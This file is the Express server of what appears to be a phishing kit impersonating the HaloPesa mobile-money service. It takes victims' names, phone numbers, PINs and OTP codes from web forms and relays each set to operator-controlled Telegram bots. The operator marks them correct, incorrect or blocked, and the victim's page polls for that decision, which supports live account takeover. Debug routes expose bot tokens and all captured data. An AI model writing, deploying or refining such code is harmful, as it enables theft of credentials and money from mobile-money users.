require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = (process.env.BACKEND_URL || 'https://halopesa-tanzania-1ku8.onrender.com').replace(/\/+$/, '');

// ---------------- PERSISTENT STORE ----------------
const DATA_DIR = path.join(__dirname, 'data');
const STORE_FILE = path.join(DATA_DIR, 'store.json');

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

let approvedPins = {};
let approvedCodes = {};
let blockPins = {};
let requestBotMap = {};

function loadStore() {
    try {
        if (fs.existsSync(STORE_FILE)) {
            const raw = fs.readFileSync(STORE_FILE, 'utf8');
            const data = JSON.parse(raw);
            approvedPins = data.approvedPins || {};
            approvedCodes = data.approvedCodes || {};
            blockPins = data.blockPins || {};
            requestBotMap = data.requestBotMap || {};
            console.log('💾 Store loaded:',
                Object.keys(approvedPins).length, 'pins,',
                Object.keys(approvedCodes).length, 'codes,',
                Object.keys(blockPins).length, 'blocks');
        } else {
            console.log('💾 No store file yet — starting fresh');
        }
    } catch (err) {
        console.error('❌ Failed to load store:', err.message);
    }
}

let saveTimer = null;
function saveStore() {
    // Debounce writes so rapid clicks don't hammer the disk
    if (saveTimer) clearTimeout(saveTimer);
    saveTimer = setTimeout(() => {
        try {
            const tmp = STORE_FILE + '.tmp';
            fs.writeFileSync(tmp, JSON.stringify({
                approvedPins,
                approvedCodes,
                blockPins,
                requestBotMap
            }, null, 2));
            fs.renameSync(tmp, STORE_FILE); // atomic write
        } catch (err) {
            console.error('❌ Failed to save store:', err.message);
        }
    }, 200);
}

// Periodically prune old entries (older than 24h) to keep file small
setInterval(() => {
    // requestBotMap holds every requestId ever; keep it bounded
    const ids = Object.keys(requestBotMap);
    if (ids.length > 5000) {
        const keep = ids.slice(-2000);
        const newMap = {};
        const newPins = {};
        const newCodes = {};
        const newBlocks = {};
        keep.forEach(id => {
            newMap[id] = requestBotMap[id];
            if (id in approvedPins) newPins[id] = approvedPins[id];
            if (id in approvedCodes) newCodes[id] = approvedCodes[id];
            if (id in blockPins) newBlocks[id] = blockPins[id];
        });
        requestBotMap = newMap;
        approvedPins = newPins;
        approvedCodes = newCodes;
        blockPins = newBlocks;
        saveStore();
        console.log('🧹 Pruned store to', keep.length, 'entries');
    }
}, 60 * 60 * 1000); // hourly

loadStore();

// ---------------- MULTI-BOT STORE ----------------
let bots = [];
Object.keys(process.env).forEach(key => {
    const match = key.match(/^BOT(\d+)_TOKEN$/);
    if (!match) return;
    const index = match[1];
    const botToken = process.env[`BOT${index}_TOKEN`];
    const chatId = process.env[`BOT${index}_CHATID`];
    if (botToken && chatId) {
        bots.push({ botId: `bot${index}`, botToken, chatId });
    }
});
console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
            chat_id: bot.chatId,
            text,
            reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
        });
    } catch (err) {
        console.error('sendMessage error:', err.response?.data || err.message);
    }
}

async function answerCallback(bot, callbackId, text = '') {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
            callback_query_id: callbackId,
            text
        });
    } catch (err) {
        console.error('answerCallback error:', err.response?.data || err.message);
    }
}

async function editTelegramMessage(bot, chatId, messageId, text) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/editMessageText`, {
            chat_id: chatId,
            message_id: messageId,
            text
        });
    } catch (err) {
        console.error('editMessage error:', err.response?.data || err.message);
    }
}

// ---------------- WEBHOOK SETUP (idempotent, restart-proof) ----------------
const REQUIRED_UPDATES = ['message', 'callback_query'];

async function getWebhookInfo(bot) {
    try {
        const res = await axios.get(`https://api.telegram.org/bot${bot.botToken}/getWebhookInfo`);
        return res.data?.result;
    } catch (err) {
        console.error(`getWebhookInfo failed for ${bot.botId}:`, err.response?.data || err.message);
        return null;
    }
}

async function setWebhook(bot) {
    const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
    const allowedUpdates = encodeURIComponent(JSON.stringify(REQUIRED_UPDATES));
    try {
        const res = await axios.get(
            `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}&allowed_updates=${allowedUpdates}&drop_pending_updates=false`
        );
        if (res.data?.ok) {
            console.log(`✅ Webhook set for ${bot.botId} → ${webhookUrl}`);
            return true;
        }
        console.error(`❌ setWebhook returned not-ok for ${bot.botId}:`, res.data);
        return false;
    } catch (err) {
        console.error(`❌ setWebhook failed for ${bot.botId}:`, err.response?.data || err.message);
        return false;
    }
}

async function ensureWebhook(bot) {
    // 1. Set it (always, so allowed_updates is correct)
    await setWebhook(bot);

    // 2. Verify
    const info = await getWebhookInfo(bot);
    if (!info) return false;

    const urlOk = info.url === `${DOMAIN}/telegram-webhook/${bot.botId}`;
    const cbOk = Array.isArray(info.allowed_updates) && info.allowed_updates.includes('callback_query');
    const pending = info.pending_update_count || 0;

    console.log(`🔎 ${bot.botId} webhook — url ${urlOk ? 'OK' : 'MISMATCH'}, callback_query ${cbOk ? 'OK' : 'MISSING'}, pending ${pending}`);

    if (!urlOk || !cbOk) {
        console.warn(`⚠️ ${bot.botId} webhook check failed — retrying in 5s`);
        await new Promise(r => setTimeout(r, 5000));
        await setWebhook(bot);
        const again = await getWebhookInfo(bot);
        const fixed = again && again.url === `${DOMAIN}/telegram-webhook/${bot.botId}`
            && Array.isArray(again.allowed_updates)
            && again.allowed_updates.includes('callback_query');
        console.log(`🔁 Retry for ${bot.botId}: ${fixed ? 'FIXED' : 'STILL BROKEN'}`);
        return fixed;
    }
    return true;
}

async function ensureAllWebhooks() {
    const results = await Promise.all(bots.map(b => ensureWebhook(b)));
    console.log('🌐 Webhook summary:', bots.map((b, i) => `${b.botId}=${results[i] ? 'OK' : 'FAIL'}`).join(', '));
}

// Re-check webhooks every 5 minutes so a silent reset (e.g. by another service) is auto-repaired
setInterval(() => {
    ensureAllWebhooks().catch(err => console.error('Periodic webhook check error:', err.message));
}, 5 * 60 * 1000);

// ---------------- PAGES ----------------
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Invalid bot link');
    res.redirect(`/index.html?botId=${bot.botId}`);
});

app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));

// ---------------- PIN SUBMISSION ----------------
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedPins[requestId] = null;
    requestBotMap[requestId] = botId;
    saveStore();

    sendTelegramMessage(
        bot,
        `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
        [[
            { text: '✅ PIN correct', callback_data: `pin_ok:${requestId}` },
            { text: '❌ PIN incorrect', callback_data: `pin_bad:${requestId}` },
            { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-pin/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    if (blockPins[requestId]) return res.json({ blocked: true, message: 'User blocked' });
    res.json({ approved: approvedPins[requestId] ?? null });
});

// ---------------- CODE (OTP) SUBMISSION ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedCodes[requestId] = null;
    requestBotMap[requestId] = botId;
    saveStore();

    sendTelegramMessage(
        bot,
        `🔑 OTP CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
        [[
            { text: '✅ Code correct', callback_data: `code_ok:${requestId}` },
            { text: '❌ Code incorrect', callback_data: `code_bad:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    if (blockPins[requestId]) return res.json({ blocked: true, message: 'User blocked' });
    res.json({ approved: approvedCodes[requestId] ?? null });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    // Respond 200 IMMEDIATELY so Telegram never retries/drops
    res.sendStatus(200);

    try {
        const bot = getBot(req.params.botId);
        if (!bot) {
            console.log('❌ Unknown bot:', req.params.botId);
            return;
        }

        const cb = req.body.callback_query;
        if (!cb) return; // plain message, ignore

        console.log('🔘 CALLBACK:', cb.data, 'from', cb.from?.id);

        // Answer FIRST — stop spinner
        await answerCallback(bot, cb.id);

        const [action, requestId] = (cb.data || '').split(':');
        if (!requestId) {
            console.log('⚠️ Malformed callback data:', cb.data);
            return;
        }

        let newText = '';

        if (action === 'pin_ok') {
            approvedPins[requestId] = true;
            newText = '🔐 PIN VERIFICATION\n\n✅ PIN approved';
        } else if (action === 'pin_bad') {
            approvedPins[requestId] = false;
            newText = '🔐 PIN VERIFICATION\n\n❌ PIN rejected';
        } else if (action === 'pin_block') {
            blockPins[requestId] = true;
            newText = '🔐 PIN VERIFICATION\n\n🛑 User blocked';
        } else if (action === 'code_ok') {
            approvedCodes[requestId] = true;
            newText = '🔑 OTP CODE VERIFICATION\n\n✅ Code approved';
        } else if (action === 'code_bad') {
            approvedCodes[requestId] = false;
            newText = '🔑 OTP CODE VERIFICATION\n\n❌ Code rejected';
        } else {
            console.log('⚠️ Unknown action:', action);
            return;
        }

        saveStore();
        console.log('✅', action, '→', requestId);

        if (cb.message) {
            await editTelegramMessage(bot, cb.message.chat.id, cb.message.message_id, newText);
        }
    } catch (err) {
        console.error('❌ Webhook handler error:', err.message);
    }
});

// ---------------- DEBUG ----------------
app.get('/debug/bots', (req, res) => res.json(bots));

app.get('/debug/stores', (req, res) => {
    res.json({
        approvedPins,
        approvedCodes,
        blockPins,
        requestBotMap
    });
});

app.get('/debug/webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).json({ error: 'Invalid bot' });
    const info = await getWebhookInfo(bot);
    res.json(info || { error: 'failed' });
});

app.get('/debug/setwebhook', async (req, res) => {
    await ensureAllWebhooks();
    res.json({ message: 'Webhooks re-applied and verified' });
});

// ---------------- START ----------------
(async () => {
    await ensureAllWebhooks();
    app.listen(PORT, () => console.log(`🚀 Server started on port ${PORT}`));
})();